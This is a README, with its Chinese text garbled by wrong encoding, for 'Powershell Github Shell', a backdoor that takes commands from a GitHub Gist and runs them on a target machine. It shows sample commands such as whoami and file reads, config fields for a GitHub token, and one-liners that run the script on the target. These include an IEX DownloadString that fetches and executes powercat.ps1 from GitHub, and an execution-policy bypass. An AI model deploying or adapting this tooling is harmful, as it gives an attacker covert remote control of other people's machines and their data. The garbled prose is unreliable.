#Powershell Github Shell
#Author:zshell
#Blog:http://www.0x7c.com
#Github:https://github.com/zlocal/Powershell-Github-Shell
#Demo Result Gist:https://gist.github.com/zlocal/1d449f3c195531c8cafbebfe808ea46e

ʹ�÷�����
1������github�˻�������https://github.com/settings/tokens/new��ѡ�� gist   Create gists ����������Gists��token.
2, ���� https://gist.github.com/ ������һ��Gist���������Ϊprivate,ֻ���Լ��ܷ��ʲ鿴���������Ϊcmd.����
Ϊ��չʾ����������public https://gist.github.com/zlocal/1d449f3c195531c8cafbebfe808ea46e
	Command:"time /T"
	ReadFile:"c:/windows/temp/1.txt"
	WriteFile:"http://www.github.com/raw/1.zip c:/wnidows/temp/2.txt"
	Powershell:"Get-Process | Out-String"
	Command:"whoami"
����
Command������Ҫִ�е�cmd��������Ѳ���OK
ReadFile���ϴ�Ŀ������ϵ��ļ���Github����δʵ��
WriteFile�����ļ���Ŀ���������δʵ��
Powershell���ǿ���ִ�е�Powershellָ���δʵ��

2, �޸�Powershell�ű���ͷ��������Ϣ
$gistsUser="gitusername";		# github���û���
$gistsApiToken="gittoken";		# �ϲ��еõ���token ����eed4239e439034a92fc4cbe0fbd2ca906999a9f1
$checkTime=60;				# ÿ�λ�ȡ��������Ҫ�ȴ���ʱ�䣬��Ϊ��λ

3, ʹpowershell��Ŀ�������ִ��
Powershellִ�з���
һ�仰Զ�̼��� 
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

һ�仰���ؼ���
powershell IEX ([System.IO.File]::readAllText('PowershellGitShell.ps1'));

һ�仰�ļ�ִ��
powershell -executionPolicy bypass -File "c:/test/PowershellGitShell.ps1"

4�������޸�cmd gist�����ݣ���$checkTime���ˢ����ҳ��������������С������Ҫʹ��URL DECODE���롣
